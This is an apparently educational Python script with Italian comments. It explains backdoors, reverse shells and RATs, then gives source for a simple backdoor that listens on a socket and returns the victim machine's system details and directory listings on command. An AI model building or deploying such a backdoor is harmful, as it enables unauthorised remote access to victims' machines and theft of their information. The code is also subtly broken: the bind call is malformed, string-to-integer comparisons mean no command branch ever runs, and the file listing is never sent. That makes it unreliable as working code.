'''
 oooooooooo.        .o.         .oooooo.   oooo    oooo oooooooooo.     .oooooo.     .oooooo.   ooooooooo.  
`888'   `Y8b      .888.       d8P'  `Y8b  `888   .8P'  `888'   `Y8b   d8P'  `Y8b   d8P'  `Y8b  `888   `Y88.
 888     888     .8"888.     888           888  d8'     888      888 888      888 888      888  888   .d88'
 888oooo888'    .8' `888.    888           88888[       888      888 888      888 888      888  888ooo88P' 
 888    `88b   .88ooo8888.   888           888`88b.     888      888 888      888 888      888  888`88b.   
 888    .88P  .8'     `888.  `88b    ooo   888  `88b.   888     d88' `88b    d88' `88b    d88'  888  `88b. 
o888bood8P'  o88o     o8888o  `Y8bood8P'  o888o  o888o o888bood8P'    `Y8bood8P'   `Y8bood8P'  o888o  o888o

Le backdoor, sono degli script che se eseguiti all'interno della macchina vittima danno la possibilità
all'attaccante di accedere da remoto al sistema informatico, le backdoor di solito creano dei canali
di comunicazione utilizzando di solito il protocollo HTTP sulla porta 80 che di norma è utilizzata per la 
navigazione internet.
Tipologie di Backdoor
Reverse shell: una tecnica per eseguire comandi sulla macchina vittima.La connessione viene generata
dalla macchina vittima alla macchina attaccante al quale viene dato accesso alla shell della vittima.
RAT (REMOTE ACCESS TROJAN):Controllo totale della macchina della vittima.
Di seguito il codice di una backdoor.
'''


import socket, platform, os
'''
Le scelta dei moduli per questo script ricade su socket, platform e os.
socket: per la comunicazione a basso livello fra macchina attaccante e vittima.
platform: per ricavare le informazioni sulla macchina attaccata.
os: per eseguire comandi sulla macchina su cui è eseguita la backdoor.
'''
SRV_ADDR = "127.0.0.1" #Inizializzazione di una variabile per l'indirizzo IP
SRV_PORT = 1234 #Inizializzazione di una variabile per la porta socket scelta

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Inizializzazione della var s che chiama il metodo socket del modulo socket che inizializza la connessione sul protoccolo IPV4 e TCP  
s.bind(SRV_ADDR, SRV_PORT)#Collegamento del socket sull inidirizzo IP E porta scelta per la comunicazione
s.listen(1)#accetta 1 connessione in ascolto
connection, address = s.accept()#avvia la comunicazione

print("client connected", address)#stampa di conferma che il client sia connesso e stampa l'inidirizzo IP

#ciclo while che fa iniziare il loop 
while 1:
    try:
        data = connection.recv(1024)#gestione in caso di errore con il try except, se riesce avvia uno stream di un buffer di 1024 byte
    except:continue
    #ciclo if che permette al client di fare alcune operazione e al server di riconoscere i caratteri ed eseguire dei comandi.
    if(data.decode('utf-8') == 1):#Alla ricezione di 1 convertito con codifica utf-8 
        tosend = platform.platform() + " " + platform.machine()#Manda le informazioni della macchina attaccata quale informazioni sul processore e sistema operativo
        connection.sendall(tosend.encode())#manda tutte le informazioni al client o attaccante
    elif(data.decode('utf-8') == 2):#alla ricezione del numero 2 prova tramite try except di mandare la lista dei folder contenuti all'interno della macchina
        data = connection.recv(1024)
        try:
            filelist = os.listdir(data.decode('utf-8'))
            tosend = ""
            for x in filelist:
                tosend += "," + x
        except:
            tosend = "Wrong path"
            connection.sendall(tosend.encode())
    elif(data.decode('utf-8') == 0):#alla ricezione di 0 chiude la connessione con il client ma resta in ascolto di altre connessioni 
        connection.close()
        connection, address = s.accept()